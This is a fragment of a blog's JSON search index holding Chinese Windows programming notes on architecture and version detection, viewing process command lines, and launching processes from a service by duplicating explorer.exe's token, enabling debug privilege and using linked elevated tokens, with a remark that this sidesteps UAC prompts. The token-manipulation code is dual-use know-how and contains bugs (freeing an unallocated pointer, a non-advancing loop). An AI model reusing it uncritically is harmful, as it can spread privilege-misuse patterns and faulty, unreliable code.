&#125;&#125;;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"监控","slug":"监控","permalink":"http://example.com/tags/%E7%9B%91%E6%8E%A7/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【windows】查询处理器架构","date":"2023-10-27T01:24:02.066Z","path":"A_OS/Windows/查询系统信息/查询处理器架构/","text":"问题： 在 arm 架构的 windows 上使用 GetSystemInfo 获取到的 wProcessorArchitecture 参数不准确。 由于 arm 架构的 windows 操作系统非常少见，所以客户端上线时并没有回归过检测 arm 操作系统。导致上线后出现驱动安装失败问题。 [toc] 使用 GetSystemInfo 查询12345678910111213141516171819202122232425262728293031323334std::string GetNcProcessorArchitecture() &#123; SYSTEM_INFO si = &#123; 0 &#125;; GetSystemInfo(&amp;si); DWORD architecture = si.wProcessorArchitecture;#if 0#define PROCESSOR_ARCHITECTURE_INTEL 0 #define PROCESSOR_ARCHITECTURE_MIPS 1 #define PROCESSOR_ARCHITECTURE_ALPHA 2#define PROCESSOR_ARCHITECTURE_PPC 3#define PROCESSOR_ARCHITECTURE_SHX 4 #define PROCESSOR_ARCHITECTURE_ARM 5 #define PROCESSOR_ARCHITECTURE_IA64 6 #define PROCESSOR_ARCHITECTURE_ALPHA64 7 #define PROCESSOR_ARCHITECTURE_MSIL 8 #define PROCESSOR_ARCHITECTURE_AMD64 9#define PROCESSOR_ARCHITECTURE_ARM64 12#endif if (architecture == PROCESSOR_ARCHITECTURE_AMD64) &#123; return &quot;amd64&quot;; &#125; else if (architecture == PROCESSOR_ARCHITECTURE_INTEL) &#123; return &quot;i386&quot;; &#125; else if (architecture == PROCESSOR_ARCHITECTURE_ARM64 || architecture == PROCESSOR_ARCHITECTURE_ARM) &#123; return &quot;arm&quot;; &#125; return &quot;&quot;; &#125; 使用 GetSystemInfo 查询的 wProcessorArchitecture 的值为 0。 查询注册表调研一番后，发现使用注册表的方式更稳妥一点。 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main() &#123; HKEY hKey; TCHAR processorArchitecture[255]; DWORD bufferSize = sizeof(processorArchitecture); // 打开注册表键 if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(&quot;SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment&quot;), 0, KEY_READ, &amp;hKey) == ERROR_SUCCESS) &#123; // 读取注册表值 if (RegQueryValueEx(hKey, TEXT(&quot;PROCESSOR_ARCHITECTURE&quot;), nullptr, nullptr, reinterpret_cast&lt;LPBYTE&gt;(processorArchitecture), &amp;bufferSize) == ERROR_SUCCESS) &#123; std::cout &lt;&lt; &quot;Processor Architecture: &quot; &lt;&lt; processorArchitecture; &#125; // 关闭注册表键 RegCloseKey(hKey); &#125; return 0;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"sysinfo","slug":"sysinfo","permalink":"http://example.com/tags/sysinfo/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"查询系统信息","slug":"A-OS/Windows/查询系统信息","permalink":"http://example.com/categories/A-OS/Windows/%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/"}]},{"title":"判断windows版本","date":"2023-10-27T01:24:02.065Z","path":"A_OS/Windows/查询系统信息/判断windows版本/","text":"[toc] 接口说明在windows操作系统上，判断系统版本号一般都是使用 GetVersionEx 函数，但是该函数 windows8.1 以后被启用了，尽管可以通过添加宏来忽略 4996 的错误。在新的API中提供了新的接口以供判断操作系统版本： Versionhelpers.h 标头 - Win32 apps | Microsoft Learn 声明的宏 本文介绍如何使用 IsWindowsVersionOrGreater 和 verifyVersionInfoW 函数。 关于如何查询windows版本号可以看这个文档： 更新 WINVER 和 _WIN32_WINNT | Microsoft Learn Windows各个版本的宏 所需的最低系统 NTDDI_VERSION的值 Windows 10 1903 “19H1” NTDDI_WIN10_19H1 (0x0A000007) Windows 10 1809 “红石 5” NTDDI_WIN10_RS5 (0x0A000006) Windows 10 1803 “红石 4” NTDDI_WIN10_RS4 (0x0A000005) Windows 10 1709 “红石 3” NTDDI_WIN10_RS3 (0x0A000004) Windows 10 1703 “红石 2” NTDDI_WIN10_RS2 (0x0A000003) Windows 10 1607 “红石 1” NTDDI_WIN10_RS1 (0x0A000002) Windows 10 1511“阈值 2” NTDDI_WIN10_TH2 (0x0A000001) Windows 10 1507“阈值” NTDDI_WIN10 (0x0A000000) Windows 8.1 NTDDI_WINBLUE (0x06030000) Windows 8 NTDDI_WIN8 (0x06020000) Windows 7 NTDDI_WIN7 (0x06010000) Windows Server 2008 NTDDI_WS08 (0x06000100) Windows Vista Service Pack 1 (SP1) NTDDI_VISTASP1 (0x06000100) Windows Vista NTDDI_VISTA (0x06000000) Windows Server 2003 Service Pack 2 (SP2) NTDDI_WS03SP2 (0x05020200) 带有 Service Pack 1 (SP1) 的 Windows Server 2003 NTDDI_WS03SP1 (0x05020100) Windows Server 2003 NTDDI_WS03 (0x05020000) Windows XP Service Pack 3 (SP3) NTDDI_WINXPSP3 (0x05010300) Windows XP Service Pack 2 (SP2) NTDDI_WINXPSP2 (0x05010200) Windows XP Service Pack 1 (SP1) NTDDI_WINXPSP1 (0x05010100) Windows XP NTDDI_WINXP (0x05010000) 补充关于 函数的三个参数的输入可以参考文档中定义的宏： 123#define OSVER(Version) ((Version) &amp; OSVERSION_MASK)#define SPVER(Version) (((Version) &amp; SPVERSION_MASK) &gt;&gt; 8)#define SUBVER(Version) (((Version) &amp; SUBVERSION_MASK) ) 除此之外，还可以使用以下宏获取三个版本号： 1234567891011/*LOWORD()得到一个32bit数的低16bit HIWORD()得到一个32bit数的高16bitLOBYTE()得到一个16bit数最低（最右边）那个字节HIBYTE()得到一个16bit数最高（最左边）那个字节*/#define LOWORD(l) ((WORD)(((DWORD_PTR)(l)) &amp; 0xffff))#define HIWORD(l) ((WORD)((((DWORD_PTR)(l)) &gt;&gt; 16) &amp; 0xffff))#define LOBYTE(w) ((BYTE)(((DWORD_PTR)(w)) &amp; 0xff))#define HIBYTE(w) ((BYTE)((((DWORD_PTR)(w)) &gt;&gt; 8) &amp; 0xff)) 示例IsWindowsVersionOrGreater 函数是 Windows API 中的一个函数，用于检查当前运行的操作系统版本是否满足指定的条件。以下是该函数的一些常见用法： 检查特定版本及以上的 Windows 版本： 1234567#include &lt;Windows.h&gt;// 示例：检查 Windows 7 及以上版本if (IsWindowsVersionOrGreater(6, 1, 0))&#123; // 在 Windows 7 或更高版本上执行某些操作&#125; 检查特定版本和 Service Pack 的 Windows 版本： 1234567#include &lt;Windows.h&gt;// 示例：检查 Windows 10 版本 1809（秋季创意者更新）及以上版本if (IsWindowsVersionOrGreater(10, 0, 17763))&#123; // 在 Windows 10 版本 1809（秋季创意者更新）或更高版本上执行某些操作&#125; 检查是否为特定 Windows Server 版本： 1234567#include &lt;Windows.h&gt;// 示例：检查是否为 Windows Server 2016 版本if (IsWindowsVersionOrGreater(HIBYTE(_WIN32_WINNT_WIN10), LOBYTE(_WIN32_WINNT_WIN10), 0))&#123; // 在 Windows Server 2016 或更高版本上执行某些操作&#125; 检查特定版本、Service Pack 和产品类型的 Windows 版本： 1234567#include &lt;Windows.h&gt;// 示例：检查 Windows 8.1 Update 版本且为工作站类型if (IsWindowsVersionOrGreater(6, 3, 0, VER_GREATER_EQUAL, VER_NT_WORKSTATION))&#123; // 在 Windows 8.1 Update 版本且为工作站类型上执行某些操作&#125; 这些示例可以帮助你理解 IsWindowsVersionOrGreater 函数的各种用法，你可以根据实际需求在代码中适当调整参数和条件。 请注意，IsWindowsVersionOrGreater 是一个动态链接库函数，在使用时需要包含 &lt;Windows.h&gt; 头文件，且需要链接到 Version.lib 库。 判断 dwPlatformIddwPlatformId 字段说明在 Windows 系统中，常用的平台标识（Platform ID）定义如下： VER_PLATFORM_WIN32s：表示 Win32s 子系统，它是为 Windows 3.1 提供的一个扩展运行环境，使得部分 32 位应用程序可以在 Windows 3.1 上运行。 VER_PLATFORM_WIN32_WINDOWS：表示 Windows 9x 系列操作系统，包括 Windows 95、Windows 98 和 Windows ME。这些操作系统都是基于 MS-DOS 的。 VER_PLATFORM_WIN32_NT：表示 Windows NT 系列操作系统，包括 Windows NT、Windows 2000、Windows XP、Windows Server 2003、Windows Vista、Windows 7、Windows 8、Windows 10 等版本。这些操作系统是基于全新的内核设计的，并具有更强大的功能和稳定性。 每个平台标识对应不同的操作系统系列，因此在开发应用程序时，根据需要选择正确的平台标识是很重要的。 判断1234567891011121314bool IsWindowsNT()&#123; OSVERSIONINFOEX osvi; ZeroMemory(&amp;osvi, sizeof(OSVERSIONINFOEX)); osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX); // osvi.dwPlatformId = VER_PLATFORM_WIN32s; // osvi.dwPlatformId = VER_PLATFORM_WIN32_WINDOWS; osvi.dwPlatformId = VER_PLATFORM_WIN32_NT; DWORDLONG conditionMask = 0; VER_SET_CONDITION(conditionMask, VER_PLATFORMID, VER_EQUAL); return VerifyVersionInfo(&amp;osvi, VER_PLATFORMID, conditionMask);&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"os","slug":"os","permalink":"http://example.com/tags/os/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"查询系统信息","slug":"A-OS/Windows/查询系统信息","permalink":"http://example.com/categories/A-OS/Windows/%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/"}]},{"title":"【windows】查看进程启动参数命令行","date":"2023-10-27T01:24:02.064Z","path":"A_OS/Windows/【win】查看进程启动命令行参数/","text":"Windows 查看进程启动参数命令行使用wmic查看1wmic process where caption=&quot;【进程名】&quot; get caption,commandline /value 也可以通过打印所有的命令行参数 1wmic process get caption,commandline /value | findstr &quot;【进程名，特征字符串等】&quot; 使用任务管理器查看打开任务管理器，在详细信息栏，右击标题列-&gt;选择列，找到命令行，勾选即可。","tags":[{"name":"cmd","slug":"cmd","permalink":"http://example.com/tags/cmd/"},{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【Windows】降权","date":"2023-10-27T01:24:02.063Z","path":"A_OS/Windows/权限与会话/降权/","text":"概述：降权操作，Windows服务进程中以低权限创建进程 [toc] 背景说明在服务程序中调用了某一个程序的安装程序，由于权限的问题，这个安装程序也继承了服务的 SYSTEM 权限，导致安装程序与预期不符合。 解决方案最终实现的目标就是在服务中以普通用户的权限去启动安装程序，要以普通用户去启动，就涉及到降权的问题，需要获取用户的信息。在任务管理器详细信息中可以看到，资源管理器是以普通用户的身份启动的，因此可以在服务中以 Explore.exe 的权限去调用安装程序。 实现逻辑此逻辑也可以用于解决 UAC 弹窗的问题。 获取token 通过token获取用户的会话ID 通过token和ID启动进程 代码接口最终调用的接口为： CreateProcessAsUser 12345678910111213141516int ExecutePackage(LPCSTR pszPath, LPCSTR pszParams)&#123; if (nullptr == pszPath) return -1; wstring szPath = stringToWstring(pszPath); wstring szParams; if (pszParams) &#123; szParams = stringToWstring(pszParams); &#125; CreateProcessWithAdmin(szPath.c_str(), szParams.c_str()); return 0;&#125; 实现实现如下所示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/** @fn * @brief CreateProcessWithAdmin* @param[in] * strpath： 程序路径* strParams: 程序执行命令* @param[out] * @return * * @detail */bool CreateProcessWithAdmin(LPCWSTR lpExePath, LPCWSTR lpParam)&#123; HANDLE hExplorerToken = GetExplorerToken(); HANDLE hTokenDup = NULL; LPVOID pEnvironment = nullptr; bool res&#123; false &#125;; char szErr[256] = &#123; 0 &#125;; int iErrCode = 0; do &#123; if (hExplorerToken == NULL) &#123; iErrCode = GetLastError(); break; &#125; // 复制令牌,把调用方有效的所有访问权限给复制后的令牌. DWORD dwReturnBytes = 0; DWORD dwReturnLen = 0; DWORD dwTokenSessionId = 0; // 通过token获取sessionId if (::GetTokenInformation(hExplorerToken, TokenSessionId, &amp;dwTokenSessionId, sizeof(DWORD), &amp;dwReturnLen) == FALSE) &#123; break; &#125; // 通过 SessionId 和 Token运行程序- res = _CreateProcessAsSystemBySession(lpExePath, lpParam, NULL, dwTokenSessionId, hExplorerToken); // 改动如下所示 // 改动 // 判断当前特权token是否已提升，如果已经提升，则直接通过当前的token启动，如果未提升，则通过提升后的token启动+ HANDLE hNewToken = NULL;+ if (GetElevatedToken(hExplorerToken, &amp;hNewToken) &amp;&amp; hNewToken)+ &#123;+ res = CreateProcessByToken(hNewToken, hExplorerToken, lpExePath, lpParam, NULL, FALSE);+ CloseHandle(hNewToken);+ &#125;+ else+ &#123;+ res = CreateProcessAsSystemBySession(lpExePath, lpParam, NULL, dwTokenSessionId, hExplorerToken);+ &#125;+ CloseHandle(hExplorerToken); &#125; while (false); return res;&#125; 判断token是否被提升： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152BOOL IsElevatedToken(HANDLE hToken, PBOOL pbElevated)&#123; DWORD dwReturnBytes = 0; DWORD dwElevateionType = 0; BOOL bElevated = FALSE; if (hToken &amp;&amp; pbElevated) &#123; if (GetTokenInformation(hToken, TokenElevationType, &amp;dwElevateionType, sizeof(dwElevateionType), &amp;dwReturnBytes)) &#123; if (dwElevateionType == TokenElevationTypeFull) bElevated = TRUE; else if (dwElevateionType == TokenElevationTypeDefault) &#123; TOKEN_ELEVATION te; ZeroMemory(&amp;te, sizeof(te)); if (GetTokenInformation(hToken, TokenElevation, &amp;te, sizeof(te), &amp;dwReturnBytes)) &#123; if (te.TokenIsElevated) bElevated = TRUE; &#125; &#125; &#125; if (pbElevated) *pbElevated = bElevated; return TRUE; &#125; return FALSE;&#125;BOOL GetElevatedToken(HANDLE hToken, PHANDLE phNewToken)&#123; BOOL bElevated = FALSE; IsElevatedToken(hToken, &amp;bElevated); if (bElevated) &#123; return DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, phNewToken); &#125; else &#123; DWORD dwReturnBytes = 0; return GetTokenInformation(hToken, TokenLinkedToken, phNewToken, sizeof(HANDLE), &amp;dwReturnBytes); &#125; return FALSE;&#125; 获取资源管理器的 token 1234567891011121314151617181920212223242526272829303132333435363738HANDLE GetExplorerToken()&#123; PromotePrivilege(); HANDLE hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapshot == INVALID_HANDLE_VALUE) &#123; return NULL; &#125; HANDLE hExplorerToken = NULL; PROCESSENTRY32 pe = &#123; 0 &#125;; pe.dwSize = sizeof(pe); BOOL bMore = ::Process32First(hSnapshot, &amp;pe); while (bMore) &#123; if (StrCmpI(L&quot;explorer.exe&quot;, pe.szExeFile) == 0) &#123; HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID); if (hProcess == NULL) &#123; continue; &#125; if (OpenProcessToken(hProcess, TOKEN_QUERY, &amp;hExplorerToken)) &#123; CloseHandle(hProcess); break; &#125; &#125; bMore = ::Process32Next(hSnapshot, &amp;pe); &#125; CloseHandle(hSnapshot); return hExplorerToken;&#125; 给本进程特权，以便访问系统进程 123456789101112131415161718192021222324252627282930313233343536373839404142/** @fn PromotePrivilege* @brief 调整进程权限 * * @detail 将进程权限提升成具有调试权限的进程，这个权限应该是进程所能具有的最大权限* 前提启动这个进程的账户必须是一个管理员，否则没法提升*/BOOL PromotePrivilege()&#123; // 附给本进程特权,以便访问系统进程 HANDLE hToken; // 打开一个进程的访问令牌 if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123; // 取得特权名称为&quot;SetDebugPrivilege&quot;的LUID LUID uID; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;uID)) &#123; CloseHandle(hToken); return FALSE; &#125; // 调整特权级别 TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; // 只启动调试权限，所以权限的个数是一个 tp.Privileges[0].Luid = uID; //当Attributes = SE_PRIVILEGE_ENABLE时，激活权限 //当Attributes = 0时，关闭权限 tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // AdjustTokenPrivileges函数激活或者关闭tp中给定的权限 if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL)) &#123; CloseHandle(hToken); return FALSE; &#125; // 关闭访问令牌句柄 CloseHandle(hToken); return TRUE; &#125; return FALSE;&#125; 设置当前进程的会话信息： 1234567891011121314151617181920212223242526272829bool CreateProcessAsSystemBySession(LPCTSTR pszAppName, LPCTSTR pszCmd, LPCTSTR pszCwd, DWORD dwSession, HANDLE hEnvToken)&#123; if (pszCmd == NULL) return false; bool bRet = false; HANDLE hTokenThis = NULL; bRet = OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY, &amp;hTokenThis); if (!bRet || hTokenThis == NULL) return false; HANDLE hTokenDup = NULL; bRet = DuplicateTokenEx(hTokenThis, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &amp;hTokenDup); CloseHandle(hTokenThis); if (!bRet || hTokenDup == NULL) return false; if (!SetTokenInformation(hTokenDup, TokenSessionId, &amp;dwSession, sizeof(DWORD))) &#123; CloseHandle(hTokenDup); return false; &#125; bRet = CreateProcessByToken(hTokenDup, hEnvToken, pszAppName, pszCmd, pszCwd, TRUE); CloseHandle(hTokenDup); return bRet;&#125; 调用接口创建进程： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566typedef BOOL(STDMETHODCALLTYPE FAR* LPFNCREATEENVIRONMENTBLOCK) (LPVOID* lpEnvironment, HANDLE hToken, BOOL bInherit);typedef BOOL(STDMETHODCALLTYPE FAR* LPFNDESTROYENVIRONMENTBLOCK) (LPVOID lpEnvironment);bool CreateProcessByToken(HANDLE hToken, HANDLE hEnvToken, LPCTSTR pszAppName, LPCTSTR pszCmd, LPCTSTR pszCwd, BOOL bWndHide/* = FALSE*/)&#123; STARTUPINFO si = &#123; sizeof(si) &#125;; PROCESS_INFORMATION pi = &#123; 0 &#125;; si.lpDesktop = (LPWSTR)L&quot;Winsta0\\\\Default&quot;; if (bWndHide) &#123; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; &#125; DWORD dwCreationFlag = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE; LPVOID pEnvironment = NULL; LPFNCREATEENVIRONMENTBLOCK lpfnCreateEnvironmentBlock = NULL; LPFNDESTROYENVIRONMENTBLOCK lpfnDestroyEnvironmentBlock = NULL; HMODULE hUserEnvLib = NULL; hUserEnvLib = LoadLibrary(L&quot;userenv.dll&quot;); if (NULL != hUserEnvLib) &#123; lpfnCreateEnvironmentBlock = (LPFNCREATEENVIRONMENTBLOCK)GetProcAddress(hUserEnvLib, &quot;CreateEnvironmentBlock&quot;); lpfnDestroyEnvironmentBlock = (LPFNDESTROYENVIRONMENTBLOCK)GetProcAddress(hUserEnvLib, &quot;DestroyEnvironmentBlock&quot;); &#125; if (NULL != lpfnCreateEnvironmentBlock) &#123; if (lpfnCreateEnvironmentBlock(&amp;pEnvironment, hEnvToken, FALSE)) &#123; dwCreationFlag |= CREATE_UNICODE_ENVIRONMENT; // must specify &#125; else pEnvironment = NULL; &#125; bool bRet = false; BOOL bDisableRedirect = FALSE; if (CreateProcessAsUser(hToken, pszAppName, (LPTSTR)pszCmd, NULL, NULL, FALSE, dwCreationFlag, pEnvironment, pszCwd, &amp;si, &amp;pi)) &#123; CloseHandle(pi.hThread); DWORD dwRet = WaitForSingleObject(pi.hProcess, 2 * 60 * 60 * 1000); if (WAIT_TIMEOUT == dwRet) &#123; &#125; else if (WAIT_OBJECT_0 == dwRet) &#123; bRet = true; &#125; CloseHandle(pi.hProcess); &#125; if (NULL != lpfnDestroyEnvironmentBlock) lpfnDestroyEnvironmentBlock(pEnvironment); if (NULL != hUserEnvLib) FreeLibrary(hUserEnvLib); return bRet;&#125;","tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"},{"name":"权限","slug":"权限","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"权限与会话","slug":"A-OS/Windows/权限与会话","permalink":"http://example.com/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"【Windows】服务中以管理员\\普通权限启动进程","date":"2023-10-27T01:24:02.062Z","path":"A_OS/Windows/权限与会话/权限与会话/","text":"概述：windows 服务中以管理员或普通权限启动进程 0x01 管理员权限启动进程123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// 管理员权限启动进程#ifdef UNICODEMMSYSSHARED_EXPORT bool CreateProcessWithAdmin(const std::wstring&amp; exe, const std::wstring&amp; param, bool show)#elseMMSYSSHARED_EXPORT bool CreateProcessWithAdmin(const std::string&amp; exe, const std::string&amp; param, bool show)#endif // UNICODE&#123; HANDLE hToken&#123; NULL &#125;; HANDLE hTokenDup&#123; NULL &#125;; LPVOID pEnvironment&#123; NULL &#125;; bool res&#123; false &#125;;#ifdef UNICODE wchar_t* cmd = (wchar_t*)param.c_str();#else char* cmd = (wchar_t*)param.c_str();#endif do &#123; if (exe.empty()) &#123; LOG_ERROR(&quot;exe is null!&quot;); break; &#125; if (!GetTokenWithProcessName(L&quot;explorer.exe&quot;, hToken)) &#123; LOG_ERROR(&quot;GetTokenWithProcessName Error: %u&quot;, GetLastError()); break; &#125; // 复制令牌,把调用方有效的所有访问权限给复制后的令牌. if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED/*TOKEN_ALL_ACCESS*/, NULL/*&amp;sa*/, SecurityImpersonation, TokenPrimary, &amp;hTokenDup)) &#123; LOG_ERROR(&quot;DuplicateTokenEx Error: %u&quot;, GetLastError()); break; &#125; STARTUPINFO si; ZeroMemory(&amp;si, sizeof(STARTUPINFO)); si.cb = sizeof(STARTUPINFO);#ifdef UNICODE wchar_t desk[]&#123; TEXT(&quot;WinSta0\\\\Default&quot;) &#125;;#else char desk[]&#123; TEXT(&quot;WinSta0\\\\Default&quot;) &#125;;#endif si.lpDesktop = desk; if (show) &#123; si.wShowWindow = SW_SHOW; &#125; else &#123; si.wShowWindow = SW_HIDE; &#125; si.dwFlags = STARTF_USESHOWWINDOW; PROCESS_INFORMATION pi; // 检索指定用户的环境变量。然后，可以将此块传递给 CreateProcessAsUser 函数。 if (!CreateEnvironmentBlock(&amp;pEnvironment, hTokenDup, FALSE)) &#123; LOG_ERROR(&quot;CreateEnvironmentBlock Error: %u&quot;, GetLastError()); break; &#125; // 缺少环境变量时某些依赖环境变量的程序打不开，或者运行不正常。 if (!CreateProcessAsUser(hTokenDup, exe.c_str(), cmd, NULL, NULL, FALSE , NORMAL_PRIORITY_CLASS /*| CREATE_NEW_CONSOLE */ | CREATE_UNICODE_ENVIRONMENT , pEnvironment, NULL, &amp;si, &amp;pi)) &#123; LOG_ERROR(&quot;CreateProcessAsUser Error: %u&quot;, GetLastError()); break; &#125; res = true; &#125; while (0); // 清理 if (cmd) &#123; delete[]cmd; &#125; if (pEnvironment) &#123; DestroyEnvironmentBlock(pEnvironment); &#125; if(hToken) CloseHandle(hToken); if (hTokenDup) CloseHandle(hTokenDup); return res;&#125; 0x02 普通用户权限启动进程1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889// 普通用户权限启动进程#ifdef UNICODEbool CreateProcessWithUser(const std::wstring&amp; exePath, const std::wstring&amp; param, bool show)#elsebool CreateProcessWithUser(const std::string&amp; exePath, const std::string&amp; param, bool show)#endif // UNICODE&#123; HANDLE hToken = 0; HANDLE hNewToken = 0; LPVOID pEnvironment&#123; NULL &#125;; bool res&#123; false &#125;; int l = param.length();#ifdef UNICODE wchar_t* cmd = new wchar_t[l + 1]; memcpy(cmd, param.c_str(), l * sizeof(wchar_t)); cmd[l] = 0;#else char* cmd = new char[l + 1]; memcpy(cmd, param.c_str(), l * sizeof(char)); cmd[l] = 0;#endif // UNICODE do &#123; if (!GetTokenWithProcessName(L&quot;explorer.exe&quot;, hToken)) &#123; LOG_ERROR(&quot;GetTokenWithProcessName Error: %u&quot;, GetLastError()); break; &#125; if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL/*&amp;sa*/, SECURITY_MAX_IMPERSONATION_LEVEL, TokenPrimary, &amp;hNewToken)) &#123; LOG_ERROR(&quot;DuplicateTokenEx Error: %u&quot;, GetLastError()); break; &#125; DWORD dwCreationFlag = NORMAL_PRIORITY_CLASS /*| CREATE_NEW_CONSOLE*/ | CREATE_UNICODE_ENVIRONMENT; // 检索指定用户的环境变量。然后，可以将此块传递给 CreateProcessAsUser 函数。 if (!CreateEnvironmentBlock(&amp;pEnvironment, hNewToken, FALSE)) &#123; LOG_ERROR(&quot;CreateEnvironmentBlock Error: %u&quot;, GetLastError()); break; &#125; STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(STARTUPINFO)); si.cb = sizeof(STARTUPINFO);#ifdef UNICODE wchar_t desktop[] = L&quot;winsta0\\\\default&quot;;#else char desktop[] = &quot;winsta0\\\\default&quot;;#endif si.lpDesktop = desktop; si.dwFlags = STARTF_USESHOWWINDOW; if (show) &#123; si.wShowWindow = SW_SHOW; &#125; else &#123; si.wShowWindow = SW_HIDE; &#125; if (!CreateProcessAsUser(hNewToken, exePath.c_str(), cmd, 0, 0, FALSE, dwCreationFlag, pEnvironment, 0, &amp;si, &amp;pi)) &#123;#ifdef UNICODE std::string ansicmd = mm::Charset::UnicodeToANSI(cmd); std::string ansibat = mm::Charset::UnicodeToANSI(exePath.c_str()); LOG_ERROR(&quot;CreateProcessAsUser error! LastError=%ld, %s, %s&quot;, GetLastError(), ansibat.c_str(), ansicmd.c_str());#else LOG_ERROR(&quot;CreateProcessAsUser error! LastError=%ld, %s, %s&quot;, GetLastError(), exePath.c_str(), cmd.c_str());#endif // UNICODE break; &#125; res = true; &#125; while (0); // 清理 delete[] cmd; if (hToken) &#123; CloseHandle(hToken); &#125; if (hNewToken) &#123; CloseHandle(hNewToken); &#125; if (pEnvironment) &#123; DestroyEnvironmentBlock(pEnvironment); &#125; return res;&#125; 0x03 根据进程名获取进程句柄123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#ifdef UNICODE bool GetTokenWithProcessName(const wchar_t* szName, HANDLE&amp; hToken)#else bool GetTokenWithProcessName(const char* szName, HANDLE&amp; hToken)#endif // _DEBUG &#123; // HANDLE hToken&#123; NULL &#125;; HANDLE hProcessSnap&#123; NULL &#125;; PROCESSENTRY32 pe32&#123; NULL &#125;; HANDLE hProcess&#123; NULL &#125;; bool res&#123; false &#125;; do &#123; // 多用户模式时任务管理器里可能出现多个explorer // 需要先获取当前会话ID，再通过枚举进程，通过比较sessionID进而得到token。 //DWORD dwSessionId = WTSGetActiveConsoleSessionId(); //PWTS_PROCESS_INFO ppi = NULL; //DWORD dwProcessCount = 0; //if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, 0, 1, &amp;ppi, &amp;dwProcessCount)) //&#123; // for (int i = 0; i &lt; dwProcessCount; i++) // &#123; // if (_wcsicmp(ppi[i].pProcessName, L&quot;explorer.exe&quot;) == 0) // &#123; // if (ppi[i].SessionId == dwSessionId) // &#123; // break; // &#125; // &#125; // &#125; // WTSFreeMemory(ppi); //&#125; hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (!hProcessSnap) &#123; LOG_ERROR(&quot;CreateToolhelp32Snapshot error! %d&quot;, GetLastError()); break; &#125; pe32.dwSize = sizeof(PROCESSENTRY32); for (Process32First(hProcessSnap, &amp;pe32); Process32Next(hProcessSnap, &amp;pe32);) &#123;#ifdef UNICODE if (_wcsicmp((pe32.szExeFile), szName))#else if (_stricmp((pe32.szExeFile), szName))#endif // _DEBUG continue; hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID); if (!hProcess) &#123; LOG_ERROR(&quot;OpenProcess error! %d&quot;, GetLastError()); break; &#125; BOOL ret = OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &amp;hToken); if(!ret) &#123; LOG_ERROR(&quot;OpenProcess error! %d&quot;, GetLastError()); break; &#125; res = true; break; &#125; &#125; while (0); if (hProcessSnap) &#123; CloseHandle(hProcessSnap); &#125; if (hProcess) &#123; CloseHandle(hProcess); &#125; return res; 